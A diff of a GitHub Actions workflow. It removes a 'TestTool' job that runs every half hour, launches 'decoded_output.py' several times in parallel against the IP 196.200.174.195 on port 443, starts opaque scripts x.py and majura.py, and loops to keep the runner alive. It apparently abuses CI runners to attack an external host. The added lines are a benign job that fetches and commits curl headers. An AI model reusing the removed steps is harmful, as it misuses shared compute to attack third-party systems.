@@ -1,64 +1,48 @@
-name: TestTool
+name: Extract curl headers
+
 on:
-  workflow_dispatch:
   push:
-    branches:
-      - main
+    branches: [ main ]
   pull_request:
-    branches:
-      - main
-  schedule:
-    - cron: "*/30 * * * *"
+    branches: [ main ]
+
 jobs:
-  build:
+  extract-curl-headers:
     runs-on: ubuntu-latest
+
     steps:
-    
       - name: Checkout repository
-        uses: actions/checkout@v4
+        uses: actions/checkout@v3
 
-      - name: Fetch latest changes
-        run: git pull origin ${{ github.head_ref }}
-
-      - name: Set up Python 3
-        uses: actions/setup-python@v3
-        with:
-           python-version: "3.x"
-
-      - name: install
-        run: pip install requests colorama
-
-      - name: Start The Code
-        run: python decoded_output.py -s 196.200.174.195 -p 443 -t 300 &
-
-      - name: Start The Code
-        run: python decoded_output.py -s 196.200.174.195 -p 443 -t 300 & python decoded_output.py -s 196.200.174.195 -p 443 -t 300 & python decoded_output.py -s 196.200.174.195 -p 443 -t 300 &
-      
-      - name: Start The Code
-        run: python x.py &
-      
-      - name: Start The Code
-        run: python majura.py &
-      
-      - name: keep alive
-        id: check_runs
+      - name: Install curl to download source
         run: |
-          echo "has_new_run=false" >> $GITHUB_OUTPUT
-          while true; do
-            sleep 10
-            latest_run=$(curl -s -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
-              "https://api.github.com/repos/${{ github.repository }}/actions/runs?per_page=1&status=queued&status=in_progress" | \
-              jq -r '.workflow_runs[0].id')
-            if [[ $latest_run != ${{ github.run_id }} ]]; then
-              echo "has_new_run=true" >> $GITHUB_OUTPUT
-              break
-            fi
-          done
-      
-      - name: Stop workflow
-        if: steps.check_runs.outputs.has_new_run == 'true'
-        run: exit 0
+          sudo apt-get update
+          sudo apt-get install -y curl
 
-      - name: keep
-        if: steps.check_runs.outputs.has_new_run == 'false'
-        run: sleep 60
+      - name: Download curl source
+        run: |
+          sudo curl -LO https://github.com/curl/curl/releases/download/curl-8_13_0/curl-8.13.0.tar.gz
+          sudo tar -xzf curl-8.13.0.tar.gz
+
+      - name: Copy curl headers to include/
+        run: |
+          sudo mkdir -p include
+          sudo cp -r curl-8.13.0/include/curl include/
+
+      - name: Configure git for commit
+        run: |
+          git config --global user.name 'GitHub Actions'
+          git config --global user.email 'action@github.com'
+          git add -A
+          git diff-index --quiet HEAD || (git commit -a -m "Added curl headers to include/" --allow-empty)
+
+      - name: Pull latest changes
+        run: |
+          git pull origin main --rebase
+          git push origin main
+
+      - name: Push changes
+        uses: ad-m/github-push-action@v0.6.0
+        with:
+          github_token: ${{ secrets.GITHUB_TOKEN }}
+          branch: main
